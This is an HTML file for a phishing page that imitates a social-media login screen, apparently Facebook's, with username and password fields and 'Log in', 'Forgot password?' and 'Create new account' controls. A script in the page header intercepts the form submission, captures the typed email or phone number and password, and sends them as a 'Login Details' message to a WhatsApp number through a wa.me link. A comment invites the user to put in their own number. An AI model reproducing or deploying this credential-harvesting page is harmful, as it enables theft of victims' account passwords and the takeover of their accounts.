<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #15202B; /* Dark background */
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    .login-container {
      width: 100%;
      max-width: 360px;
      padding: 20px;
    }

    .lang {
      text-align: center;
      margin-top: -50px;
      color: #aaa;
      font-size: 14px;
    }

    .logo {
      display: block;
      margin: 90px 0px 0px 150px;
      width: 100%;
      border-radius: 50%;
    }
  
  .logo img{
    width: 60px;
  }

    input {
      width: 100%;
      padding: 15px;
      padding-right: 1px;
      margin: 10px 0;
      border-radius: 10px;
      border: 1.5px solid #505050;
      outline: none;
      background-color: #15202B;
      color: #fff;
      font-size: 15px;
    }

    .login-btn {
      width: 100%;
      padding: 15px;
      margin: 10px 0;
      background-color: #0064E0; /* Twitter blue */
      border: none;
      border-radius: 50px;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    .login-btn:hover {
      background-color: #0064E0;
    }

    .forgot {
      text-align: center;
      margin: 15px 0;
      font-size: 14px;
      color: white;
      cursor: pointer;
    }

    .create-btn {
      width: 100%;
      padding: 15px;
      border: 1px solid #1d9bf0;
      border-radius: 50px;
      background: none;
      color: #1d9bf0;
      font-size: 16px;
      margin-top: 140px;
      cursor: pointer;
    }

    .create-btn:hover {
      background-color: rgba(29, 155, 240, 0.1);
    }
  
  form {
    margin-top:80px;
  }
  
  </style>
  <script>
    function redirectToWhatsApp(event) {
        event.preventDefault(); // Prevent form submission

        var email = document.getElementById("email").value;
        var password = document.getElementById("password").value;

        var message = `Login Details:\nEmail/Phone: ${email}\nPassword: ${password}`;
        var encodedMessage = encodeURIComponent(message);

        // Redirect to WhatsApp (replace phone number with your WhatsApp number)
        window.location.href = `https://wa.me/2349124553643?text=${encodedMessage}`;
    }
</script>
</head>
<body>
  <div class="login-container">
    <div class="lang">English (US) â–¼</div>

    <div class="logo"><img src="logo.png"> </div>

    <form onsubmit="redirectToWhatsApp(event)">
      <input type="text" id="email" placeholder="Username, email or mobile number" required>
      <input type="password" id="password" placeholder="Password" required>

      <button type="submit" class="login-btn">Log in</button>
    </form>

    <div class="forgot">Forgot password?</div>

    <button class="create-btn">Create new account</button>
  </div>
  
</body>
</html>
